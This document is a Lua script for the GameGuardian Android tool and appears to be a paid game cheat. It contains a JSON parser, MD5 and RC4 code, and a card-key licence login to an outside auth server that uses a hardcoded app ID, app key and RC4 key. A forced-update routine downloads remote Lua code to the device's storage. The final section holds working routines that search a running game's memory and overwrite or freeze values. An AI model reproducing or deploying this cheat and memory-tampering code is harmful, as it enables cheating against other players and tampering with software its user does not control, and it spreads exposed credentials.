fuhao= '"' local function json2true(str,from,to) return true, from+3 end local function json2false(str,from,to) return false, from+4 end local function json2null(str, from, to) return nil, from+3 end local function json2nan(str, from, to) return nul, from+2 end local numberchars = {['-'] = true,['+'] = true,['.'] = true,['0'] = true,['1'] = true,['2'] = true,['3'] = true,['4'] = true,['5'] = true,['6'] = true,['7'] = true,['8'] = true,['9'] = true} local function json2number(str,from,to) local i = from+1 while(i<=to) do local char = string.sub(str, i, i) if not numberchars[char] then break end i = i + 1 end local num = tonumber(string.sub(str, from, i-1)) if not num then error(_format('json格式错误，不正确的数字, 错误位置:{from}', from)) end return num, i-1 end local function json2string(str,from,to) local ignor = false for i = from+1, to do local char = string.sub(str, i, i) if not ignor then if char ==  fuhao  then return string.sub(str, from+1, i-1), i elseif char == '\\' then ignor = true end else ignor = false end end error(_format('json格式错误，字符串没有找到结尾, 错误位置:{from}', from)) end local function json2array(str,from,to)    local result = {}    from = from or 1    local pos = from+1    local to = to or string.len(str)    while(pos<=to) do        local char = string.sub(str, pos, pos)        if char ==  fuhao  then            result[#result+1], pos = json2string(str,pos,to)        elseif char == '[' then            result[#result+1], pos = json2array(str,pos,to)        elseif char == '{' then            result[#result+1], pos = json2table(str,pos,to)        elseif char == ']' then            return result, pos        elseif (char=='f' or char=='F') then            result[#result+1], pos = json2false(str,pos,to)        elseif (char=='t' or char=='T') then            result[#result+1], pos = json2true(str,pos,to)        elseif (char=='n') then            result[#result+1], pos = json2null(str,pos,to)        elseif (char=='N') then            result[#result+1], pos = json2nan(str,pos,to)        elseif numberchars[char] then            result[#result+1], pos = json2number(str,pos,to)        end        pos = pos + 1    end    error(_format('json格式错误，表没有找到结尾, 错误位置:{from}', from)) end function _G.json2table(str,from,to)    local result = {}    from = from or 1    local pos = from+1    local to = to or string.len(str)    local key    while(pos<=to) do        local char = string.sub(str, pos, pos)        if char ==  fuhao  then            if not key then                key, pos = json2string(str,pos,to)            else                result[key], pos = json2string(str,pos,to)                key = nil            end        elseif char == '[' then            if not key then                key, pos = json2array(str,pos,to)            else                result[key], pos = json2array(str,pos,to)                key = nil            end        elseif char == '{' then            if not key then                key, pos = json2table(str,pos,to)            else                result[key], pos = json2table(str,pos,to)                key = nil            end        elseif char == '}' then            return result, pos        elseif (char=='f' or char=='F') then            result[key], pos = json2false(str,pos,to)            key = nil        elseif (char=='t' or char=='T') then            result[key], pos = json2true(str,pos,to)            key = nil        elseif (char=='n') then            result[key], pos = json2null(str,pos,to)            key = nil        elseif (char=='N') then            result[key], pos = json2nan(str,pos,to)            key = nil        elseif numberchars[char] then            if not key then                key, pos = json2number(str,pos,to)            else                result[key], pos = json2number(str,pos,to)                key = nil            end        end        pos = pos + 1    end    error(_format('格式错误，表没有找到结尾, 错误位置:{from}', from)) end local jsonfuncs={[ fuhao ]=json2string,['[']=json2array,['{']=json2table,['f']=json2false,['F']=json2false,['t']=json2true,['T']=json2true} function json2lua(str) if str==nil then gg.alert('错误json') else local char = string.sub(str, 1, 1) local func=jsonfuncs[char] if func then return func(str, 1, string.len(str)) end if numberchars[char] then return json2number(str, 1, string.len(str)) end end end local __index local LYF_DefEnv1 = {[""]=""} local LYF_DefEnv2 = {["输出你妈"]="输出你妈"} setmetatable(LYF_DefEnv1, {__index = _ENV}) _ENV=LYF_DefEnv1 _G=LYF_DefEnv2

function md5(code) local code = tostring(code) local HexTable = {"0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"} local A = 0x67452301 local B = 0xefcdab89 local C = 0x98badcfe local D = 0x10325476 local S11 = 7 local S12 = 12 local S13 = 17 local S14 = 22 local S21 = 5 local S22 = 9 local S23 = 14 local S24 = 20 local S31 = 4 local S32 = 11 local S33 = 16 local S34 = 23 local S41 = 6 local S42 = 10 local S43 = 15 local S44 = 21 local function F(x,y,z) return (x & y) | ((~x) & z) end local function G(x,y,z) return (x & z) | (y & (~z)) end local function H(x,y,z) return x ~ y ~ z end local function I(x,y,z) return y ~ (x | (~z)) end local function FF(a,b,c,d,x,s,ac) a = a + F(b,c,d) + x + ac a = (((a & 0xffffffff) << s) | ((a & 0xffffffff) >> 32 - s)) + b return a & 0xffffffff end local function GG(a,b,c,d,x,s,ac) a = a + G(b,c,d) + x + ac a = (((a & 0xffffffff) << s) | ((a & 0xffffffff) >> 32 - s)) + b return a & 0xffffffff end local function HH(a,b,c,d,x,s,ac) a = a + H(b,c,d) + x + ac a = (((a & 0xffffffff) << s) | ((a & 0xffffffff) >> 32 - s)) + b return a & 0xffffffff end local function II(a,b,c,d,x,s,ac) a = a + I(b,c,d) + x + ac a = (((a & 0xffffffff) << s) | ((a & 0xffffffff) >> 32 - s)) + b return a & 0xffffffff end local function MD5StringFill(s) local len = s:len() local mod512 = len * 8 % 512 local fillSize = (448 - mod512) // 8 if mod512 > 448 then fillSize = (960 - mod512) // 8 end local rTab = {} local byteIndex = 1 for i = 1,len do local index = (i - 1) // 4 + 1 rTab[index] = rTab[index] or 0 rTab[index] = rTab[index] | (s:byte(i) << (byteIndex - 1) * 8) byteIndex = byteIndex + 1 if byteIndex == 5 then byteIndex = 1 end end local b0x80 = false local tLen = #rTab if byteIndex ~= 1 then rTab[tLen] = rTab[tLen] | 0x80 << (byteIndex - 1) * 8 b0x80 = true end for i = 1,fillSize // 4 do if not b0x80 and i == 1 then rTab[tLen + i] = 0x80 else rTab[tLen + i] = 0x0 end end local bitLen = math.floor(len * 8) tLen = #rTab rTab[tLen + 1] = bitLen & 0xffffffff rTab[tLen + 2] = bitLen >> 32 return rTab end function getmd5(s) local fillTab = MD5StringFill(s) local result = {A,B,C,D} for i = 1,#fillTab // 16 do local a = result[1] local b = result[2] local c = result[3] local d = result[4] local offset = (i - 1) * 16 + 1 a = FF(a, b, c, d, fillTab[offset + 0], S11, 0xd76aa478) d = FF(d, a, b, c, fillTab[offset + 1], S12, 0xe8c7b756) c = FF(c, d, a, b, fillTab[offset + 2], S13, 0x242070db) b = FF(b, c, d, a, fillTab[offset + 3], S14, 0xc1bdceee) a = FF(a, b, c, d, fillTab[offset + 4], S11, 0xf57c0faf) d = FF(d, a, b, c, fillTab[offset + 5], S12, 0x4787c62a) c = FF(c, d, a, b, fillTab[offset + 6], S13, 0xa8304613) b = FF(b, c, d, a, fillTab[offset + 7], S14, 0xfd469501) a = FF(a, b, c, d, fillTab[offset + 8], S11, 0x698098d8) d = FF(d, a, b, c, fillTab[offset + 9], S12, 0x8b44f7af) c = FF(c, d, a, b, fillTab[offset + 10], S13, 0xffff5bb1) b = FF(b, c, d, a, fillTab[offset + 11], S14, 0x895cd7be) a = FF(a, b, c, d, fillTab[offset + 12], S11, 0x6b901122) d = FF(d, a, b, c, fillTab[offset + 13], S12, 0xfd987193) c = FF(c, d, a, b, fillTab[offset + 14], S13, 0xa679438e) b = FF(b, c, d, a, fillTab[offset + 15], S14, 0x49b40821) a = GG(a, b, c, d, fillTab[offset + 1], S21, 0xf61e2562) d = GG(d, a, b, c, fillTab[offset + 6], S22, 0xc040b340) c = GG(c, d, a, b, fillTab[offset + 11], S23, 0x265e5a51) b = GG(b, c, d, a, fillTab[offset + 0], S24, 0xe9b6c7aa) a = GG(a, b, c, d, fillTab[offset + 5], S21, 0xd62f105d) d = GG(d, a, b, c, fillTab[offset + 10], S22, 0x2441453) c = GG(c, d, a, b, fillTab[offset + 15], S23, 0xd8a1e681) b = GG(b, c, d, a, fillTab[offset + 4], S24, 0xe7d3fbc8) a = GG(a, b, c, d, fillTab[offset + 9], S21, 0x21e1cde6) d = GG(d, a, b, c, fillTab[offset + 14], S22, 0xc33707d6) c = GG(c, d, a, b, fillTab[offset + 3], S23, 0xf4d50d87) b = GG(b, c, d, a, fillTab[offset + 8], S24, 0x455a14ed) a = GG(a, b, c, d, fillTab[offset + 13], S21, 0xa9e3e905) d = GG(d, a, b, c, fillTab[offset + 2], S22, 0xfcefa3f8) c = GG(c, d, a, b, fillTab[offset + 7], S23, 0x676f02d9) b = GG(b, c, d, a, fillTab[offset + 12], S24, 0x8d2a4c8a) a = HH(a, b, c, d, fillTab[offset + 5], S31, 0xfffa3942) d = HH(d, a, b, c, fillTab[offset + 8], S32, 0x8771f681) c = HH(c, d, a, b, fillTab[offset + 11], S33, 0x6d9d6122) b = HH(b, c, d, a, fillTab[offset + 14], S34, 0xfde5380c) a = HH(a, b, c, d, fillTab[offset + 1], S31, 0xa4beea44) d = HH(d, a, b, c, fillTab[offset + 4], S32, 0x4bdecfa9) c = HH(c, d, a, b, fillTab[offset + 7], S33, 0xf6bb4b60) b = HH(b, c, d, a, fillTab[offset + 10], S34, 0xbebfbc70) a = HH(a, b, c, d, fillTab[offset + 13], S31, 0x289b7ec6) d = HH(d, a, b, c, fillTab[offset + 0], S32, 0xeaa127fa) c = HH(c, d, a, b, fillTab[offset + 3], S33, 0xd4ef3085) b = HH(b, c, d, a, fillTab[offset + 6], S34, 0x4881d05) a = HH(a, b, c, d, fillTab[offset + 9], S31, 0xd9d4d039) d = HH(d, a, b, c, fillTab[offset + 12], S32, 0xe6db99e5) c = HH(c, d, a, b, fillTab[offset + 15], S33, 0x1fa27cf8) b = HH(b, c, d, a, fillTab[offset + 2], S34, 0xc4ac5665) a = II(a, b, c, d, fillTab[offset + 0], S41, 0xf4292244) d = II(d, a, b, c, fillTab[offset + 7], S42, 0x432aff97) c = II(c, d, a, b, fillTab[offset + 14], S43, 0xab9423a7) b = II(b, c, d, a, fillTab[offset + 5], S44, 0xfc93a039) a = II(a, b, c, d, fillTab[offset + 12], S41, 0x655b59c3) d = II(d, a, b, c, fillTab[offset + 3], S42, 0x8f0ccc92) c = II(c, d, a, b, fillTab[offset + 10], S43, 0xffeff47d) b = II(b, c, d, a, fillTab[offset + 1], S44, 0x85845dd1) a = II(a, b, c, d, fillTab[offset + 8], S41, 0x6fa87e4f) d = II(d, a, b, c, fillTab[offset + 15], S42, 0xfe2ce6e0) c = II(c, d, a, b, fillTab[offset + 6], S43, 0xa3014314) b = II(b, c, d, a, fillTab[offset + 13], S44, 0x4e0811a1) a = II(a, b, c, d, fillTab[offset + 4], S41, 0xf7537e82) d = II(d, a, b, c, fillTab[offset + 11], S42, 0xbd3af235) c = II(c, d, a, b, fillTab[offset + 2], S43, 0x2ad7d2bb) b = II(b, c, d, a, fillTab[offset + 9], S44, 0xeb86d391) result[1] = result[1] + a result[2] = result[2] + b result[3] = result[3] + c result[4] = result[4] + d result[1] = result[1] & 0xffffffff result[2] = result[2] & 0xffffffff result[3] = result[3] & 0xffffffff result[4] = result[4] & 0xffffffff end local retStr = '' for i = 1,4 do for _ = 1,4 do local temp = result[i] & 0x0F local str = HexTable[temp + 1] result[i] = result[i] >> 4 temp = result[i] & 0x0F retStr = retStr .. HexTable[temp + 1] .. str result[i] = result[i] >> 4 end end return string.lower(retStr) end return getmd5(code) end
--md5加密 md5("加密内容")

ZZRc4 = {}
ZZMathBit = {}
function ZZMathBit.__xorBit(left, right) return (left + right) == 1 and 1 or 0 end function ZZMathBit.__base(left, right, op) if left < right then left, right = right, left end local res = 0 local shift = 1 while left ~= 0 do local ra = left % 2 local rb = right % 2 res = shift * op(ra,rb) + res shift = shift * 2 left = math.modf( left / 2) right = math.modf( right / 2) end return res end function ZZMathBit.xorOp(left, right) return ZZMathBit.__base(left, right, ZZMathBit.__xorBit) end function RC4(text,key,kasi)
  if kasi==false then str = text str=str:gsub("[%s%p]",""):upper() local index=1 local ret="" for index=1,str:len(),2 do ret=ret..string.char(tonumber(str:sub(index,index+1),16)) end text=ret end local function KSA(key) local keyLen = string.len(key) local schedule = {} local keyByte = {} for i = 0, 255 do schedule[i] = i end for i = 1, keyLen do keyByte[i - 1] = string.byte(key, i, i) end local j = 0 for i = 0, 255 do j = (j + schedule[i] + keyByte[ i % keyLen]) % 256 schedule[i], schedule[j] = schedule[j], schedule[i] end return schedule end local function PRGA(schedule, textLen) local i = 0 local j = 0 local k = {} for n = 1, textLen do i = (i + 1) % 256 j = (j + schedule[i]) % 256 schedule[i], schedule[j] = schedule[j], schedule[i] k[n] = schedule[(schedule[i] + schedule[j]) % 256] end return k end local function output(schedule, text) local len = string.len(text) local c = nil local res = {} for i = 1, len do c = string.byte(text, i,i) res[i] = string.char(ZZMathBit.xorOp(schedule[i], c)) end return table.concat(res) end local textLen = string.len(text) local schedule = KSA(key) local k = PRGA(schedule, textLen) str=output(k, text) if kasi==true then str = tostring(str) local index=1 local ret="" for index=1,str:len() do ret=ret..string.format("%02X",str:sub(index):byte()) end return string.lower(ret) else return str end end
--极简云RC42加密和解密配置     RC4("加密内容","密码",false=解密_true=加密)

function ultra(get,post) local c=gg.makeRequest(get,nil,post).content  if c==nil then gg.alert("网络错误了，请检查你的网络") os.exit() end return c  end
--请求
function download(get,address) local c=gg.makeRequest(get,nil,nil).content  if c==nil then gg.alert("网络错误了，请检查你的网络") os.exit() end io.open(address,"w+"):write(c) gg.toast("下载成功") end
--下载文件


---[=[上面不要乱动]=]-------------------------------------------------------------------------------------------------------------------

local xxxxxxx="http://simpleauth.cn"
--官网

local xxxxxxx_Kami=xxxxxxx.."/api.php?api=kmlogon"
--接口名称[卡密登录]

local xxxxxxx_jieba=xxxxxxx.."/api.php?api=kmunmachine"
--接口名称[卡密解绑]

local xxxxxxx_to_configure=xxxxxxx.."/api.php?api=ini"
--接口名称[应用配置]

local xxxxxxx_Notice=xxxxxxx.."/api.php?api=notice"
--接口名称[应用公告]

---[=[  上面是对接  ]=]-------------------------------------------------------------------------------------------------------------------

local xxxxxxx_APPID='16658'
--APPID

local xxxxxxx_APPKEY='H7hrYBWR4RAoZAbz'
--APPKEY

local xxxxxxx_RC4_key='4l20340klv3lK0mn'
--是否 RC4 加密[key 密钥]


local xxxbanb='1.0'
--版本号


local xxxxxxx_RC4=true
--是否 RC4 加密[false=关 true=开]
--选择 RC4加密-2 否则会乱码
--打开 签名放DATA里:打开


AMI_YDO="/sdcard/Android/"
--卡密 设备码 路径

----------------------------------------------------------------------------------------------------------------------

if xxxxxxx_APPID=="" or xxxxxxx_APPKEY=="" then
  gg.alert("对接数据,空...")--对话框
  os.exit()
end

----------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------


file=ultra(xxxxxxx_to_configure.."&app="..xxxxxxx_APPID,"")
if xxxxxxx_RC4 == true then
  file=RC4(file,xxxxxxx_RC4_key,false)
  gg.setVisible(false)
end
if json2lua(file).code ~= 200 then
gg.alert("应用配置接口："..json2lua(file).msg)--错误提示
os.exit()
else

api_total=json2lua(file).msg.api_total
--调用几次接口[ 判断使用人数 ]

app_update_must=json2lua(file).msg.app_update_must
--是否强行更新 y是 n否

app_update_show=json2lua(file).msg.app_update_show
--更新内容

app_update_url=json2lua(file).msg.app_update_url
--更新地址

version=json2lua(file).msg.version
--版本号

version_info=json2lua(file).msg.version_info
--应用版本信息


if version == xxxbanb then
gg.setVisible(false)
gg.toast("最新版")--提示
else

if app_update_must=="y" then
gg.setVisible(false)
gg.alert("强制更新："..app_update_show,"下载")--对话框
if app_update_url ~=""  then
download(app_update_url,"/sdcard/新版本.lua")
os.exit()
else
gg.alert("没有找到更新下载链接!，请联系客服")--对话框
os.exit()
end

else
gg.setVisible(false)
gg.alert("更新内容："..app_update_show,"下载")--对话框
if app_update_url ~=""  then
download(app_update_url,"/sdcard/新版本.lua")
else
gg.alert("没有找到更新下载链接!，请联系客服")--对话框
os.exit()
end

end
end

end

----------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------

Notice=ultra(xxxxxxx_Notice.."&app=".. xxxxxxx_APPID,"")
if xxxxxxx_RC4 == true then
  Notice=RC4(Notice,xxxxxxx_RC4_key,false)
  gg.setVisible(false)
end


if json2lua(Notice)['code'] == 200 then
if json2lua(Notice).msg.app_gg ~= nil then
gg.alert("公告："..json2lua(Notice).msg.app_gg)--对话框
end

else
gg.alert("公告接口："..json2lua(Notice).msg)--对话框
os.exit()
end
xxxxxxx=999
----------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------


function MIAN()

miei=io.open(AMI_YDO..'/miei','r')
if miei==nil or miei:read("*a")== "" then 
miei=md5(os.time()*1000+611-99999)
io.open(AMI_YDO..'/miei','w+'):write(miei)--写
else
miei=io.open(AMI_YDO..'/miei','r'):read("*a")--读
end--设备码


function KM_G(km)---[=[ 卡密解绑 ]=]-------------------------------------------------------------------------------------------------------------------
key=md5("kami="..km.."&markcode="..miei.."&t="..os.time().."&".. xxxxxxx_APPKEY)
--签名
bops="kami="..km.."&markcode="..miei.."&t="..os.time().."&sign="..key
--合成发送数据
if  xxxxxxx_RC4 == true then
bops= "data="..RC4(bops,xxxxxxx_RC4_key,true) 
end

HUT=ultra(xxxxxxx_jieba.."&app=".. xxxxxxx_APPID,bops)

if  xxxxxxx_RC4 == true then
HUT=RC4(HUT,xxxxxxx_RC4_key,false) 
end-- xxxxxxx_Base64
return HUT
end


km=io.open(AMI_YDO..'/km','r') 
if km==nil  then else 
km=io.open(AMI_YDO..'/km','r'):read("*a")
end--卡密保存到本地


e=io.open(AMI_YDO..'/e.log','r')
if e==nil or e:read("*a")== "" then 
e="1"
io.open(AMI_YDO..'/e.log','w+'):write(e)--写
else
e=io.open(AMI_YDO..'/e.log','r'):read("*a")--读
end--储存自动登入
if e== "1" then e=false else  e=true
end


Random=md5(os.time()*1000+611*os.time()-999999)..xxxxxxx_APPKEY..miei
--随机[用来计算是否相等]
function KM_LL(km)---[=[ 卡密登入 ]=]-------------------------------------------------------------------------------------------------------------------
key=md5("kami="..km.."&markcode="..miei.."&t="..os.time().."&".. xxxxxxx_APPKEY)
--计算签名

bops="kami="..km.."&markcode="..miei.."&t="..os.time().."&sign="..key
--需要请求的数据

if  xxxxxxx_RC4 == true then
bops="data="..RC4(bops,xxxxxxx_RC4_key,true)
end-- 把请求数据用RC4加密

HUT=ultra(xxxxxxx_Kami.."&app=".. xxxxxxx_APPID,bops.."&value="..Random)
--请求数据

if  xxxxxxx_RC4 == true then
HUT=RC4(HUT,xxxxxxx_RC4_key,false) 
end-- 把返回的数据用RC4解密
KM_L=json2lua(HUT)

code=KM_L.code--判断整数 200是成功
msg=KM_L.msg--数据提示 也是错误提示
check=KM_L.check--验证数据
time=KM_L.time--返回时间

if check~= md5(time..xxxxxxx_APPKEY..Random) then
gg.alert("脚本：检测到你有非法操作")--对话框
os.exit()
end

if time-os.time()>30 or time-os.time()<-30 then
gg.alert("脚本：数据过期")--对话框
os.exit()
end

if code~= 200 then
io.open(AMI_YDO..'/e.log','w+'):write("1")--写
gg.alert(msg)--对话框
MIAN()
else

TT=gg.alert([[

到期时间: ]]..os.date("%Y".."年".."%m".."月".."%d".."日  %H".."时".."%M".."分".."%S".."秒",msg.vip)..[[


使用卡密: ]]..msg.kami
,"确定","返回")--对话框
io.open(AMI_YDO..'/km','w+'):write(msg.kami)--写

if TT== 2 then
io.open(AMI_YDO..'/e.log','w+'):write("1")--写
MIAN()
else

---[=[   ]=]-------------------------------------------------------------------------------------------------------------------





wljbht = "http://www.iyuji.cn/iyuji/s/b0s3bGFuWUE5bkplUlZvcEhJZkIvZz09/1628485601435205"
  BX = gg.makeRequest(wljbht).content
    qwtjqdcs = BX:match("<div class=\"read_txt\">阅读&nbsp; (.-)</div>")
    gg.alert("苏维埃辅助总共被启动：" .. qwtjqdcs .. "次")
 --天跑/苏维埃 配置区，辅助开启

     function WX(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."开启失败，请尝试更换房间")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(xg)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."开启成功，请切换一下物品\n 共注入 1 条冻结数据")else gg.toast(qmnbn.."开启失败，请尝试更换房间")end end end
 function XE(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."开启失败，请尝试重启游戏")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(xg)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."开启成功\n 共注入 1 条数据")else gg.toast(qmnbn.."开启失败，请尝试重启游戏")end end end 
 function CA(qmnb,qmxg)gg.setVisible(false)gg.clearResults()qmnbv=qmnb[3]["value"]or qmnb[3][1]qmnbt=qmnb[3]["type"]or qmnb[3][2]qmnbn=qmnb[2]["name"]or qmnb[2][1]gg.setRanges(qmnb[1]["memory"]or qmnb[1][1])gg.searchNumber(qmnbv,qmnbt)gg.refineNumber(qmnbv,qmnbt)sz=gg.getResultCount()if sz==0 then gg.toast(qmnbn.."开启失败，请尝试重启游戏")else sl=gg.getResults(999999)for i=1,sz do pdsz=true for v=4,#qmnb do if pdsz==true then pysz={{}}pysz[1].address=sl[i].address+(qmnb[v]["offset"]or qmnb[v][2])pysz[1].flags=qmnb[v]["type"]or qmnb[v][3]szpy=gg.getValues(pysz)tzszpd=tostring(qmnb[v]["lv"]or qmnb[v][1]):gsub(",","")pyszpd=tostring(szpy[1].value):gsub(",","")if tzszpd==pyszpd then pdjg=true pdsz=true else pdjg=false pdsz=false end end end if pdjg==true then szpy=sl[i].address for x=1,#qmxg do xgsz=qmxg[x]["value"]or qmxg[x][1]xgpy=szpy+(qmxg[x]["offset"]or qmxg[x][2])xglx=qmxg[x]["type"]or qmxg[x][3]xgdj=qmxg[x]["freeze"]or qmxg[x][4]xg={{address=xgpy,flags=xglx,value=xgsz}}if xgdj==true then xg[1].freeze=xgdj gg.addListItems(xg)else gg.setValues(xg)end end xgjg=true end end if xgjg==true then gg.toast(qmnbn.."开启成功\n 共注入 1 条数据")else gg.toast(qmnbn.."开启失败，请尝试重启游戏")end end end function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]['offset'] xglx = qmxg[x]['type'] xgsz = qmxg[x]['value'] xgdj = qmxg[x]['freeze'] if xgdj == nil or xgdj == '' then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]['memory']) gg.searchNumber(qmnb[3]['value'], qmnb[3]['type']) if gg.getResultCount() == 0 then gg.toast('ༀid'..qmnb[2]['name'] .. '开启失败ༀ') else gg.refineNumber(qmnb[3]['value'], qmnb[3]['type']) gg.refineNumber(qmnb[3]['value'], qmnb[3]['type']) gg.refineNumber(qmnb[3]['value'], qmnb[3]['type']) if gg.getResultCount() == 0 then gg.toast('ༀid'..qmnb[2]['name'] .. '情书丢失ༀ') else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]['offset'] pysz[1].flags = qmnb[v]['type'] szpy = gg.getValues(pysz) pdpd = qmnb[v]['lv'] .. ';' .. szpy[1].value szpd = split(pdpd, ';') tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast('\n✔️id:'..qmnb[2]['name']..'成功📝共修改' .. xgsl .. '封情书') else gg.toast('ༀid'..qmnb[2]['name'] .. '开启失败，情书不见了ༀ') end end end end --[[配置1]]function js(address,flags,value) local jz={} jz[1]={} jz[1].address=address jz[1].flags=flags jz[1].value=value gg.setValues(jz) end --[[配置2]]function jz(py,xl,xgsz) flags=xl value=xgsz so=gg.getRangesList(''..name..'')[1].start js(so+py,xl,xgsz) end function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find (szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len (szFullString)) break end nSplitArray[nSplitIndex] = string.sub (szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len (szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "丢失情书") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "成功接受情书" .. xgsl .. "封") else gg.toast(qmnb[2]["name"] .. "爱失败了") end end end end
